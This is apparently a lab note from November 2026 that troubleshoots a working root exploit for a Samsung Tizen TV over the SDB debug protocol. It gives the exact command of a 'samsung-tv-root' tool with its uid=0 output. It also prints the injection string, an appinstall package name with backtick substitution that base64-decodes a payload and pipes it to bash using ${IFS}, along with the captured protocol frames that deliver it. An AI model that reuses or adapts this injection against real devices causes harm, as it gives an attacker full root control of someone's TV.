# Native SDB client vs Samsung `sdb` on tv-living

Date: 2026-11-11
Target: `T-PTMDEUC-REL-202602250226`, `sdbd 2.2.31`, plugin `3.8.5_TV_REL`

## Correction

The TV is **not** blocking the package-name foothold. The reference
`samsung-tv-root` method still works on this unit:

```console
$ SDB=~/tizen-studio/tools/sdb .venv/bin/python -m samsung_tv_root \
    --sdb ~/tizen-studio/tools/sdb qn90b root 172.17.2.110 --command 'id'
...
uid_after=0
euid_after=0
gid_after=0
egid_after=0
...
uid=0(root) gid=0(root) ... context="User"
[exit:0]
```

The same run also completes the compatibility preflight and stages the
`qn90b31` payload on the .NET Core 3.1 CLR.

## What fails

Our native `tv-sdb` client sends what appears to be the same service:

```text
shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<base64>|base64${IFS}-d|bash`.tpk
```

but the TV replies with `CLSE` and our client reports
`TV refused service "shell:0 appinstall tpk …"`.

The exact reference argument, replayed through our native client, is also
refused. Through Samsung's `sdb` the same argument runs.

## Captured difference

Through a local TCP proxy, Samsung's sdb server sends this sequence on one
connection:

```text
CNXN 0x100000 0x40000 host::
OPEN capability:
OKAY / CLSE
OPEN shell:0 appinstall tpk new2.tpk`…`.tpk
```

Our native client sends the same `CNXN`, `capability:`, and shell service with
the same payload bytes. The frame fields and service strings are byte-for-byte
equivalent apart from channel IDs. Channel IDs were varied and did not change
the result. The native client also succeeds for ordinary `shell:` verbs.

## Current conclusion

The TV and sdbd plugin accept the reference injection. The failure is isolated
to the native SDB client/session behavior, not the TV, package-name validation,
or the FDET payload. The reference `qn90b root --command 'id'` result is the
authoritative confirmation that the rooting phase works on `tv-living`.

Further work should compare the Samsung sdb server's device transport/session
state with a direct native connection, rather than treating the TV as blocked.
Do not weaken TV-side validation or persistence guards while doing so.
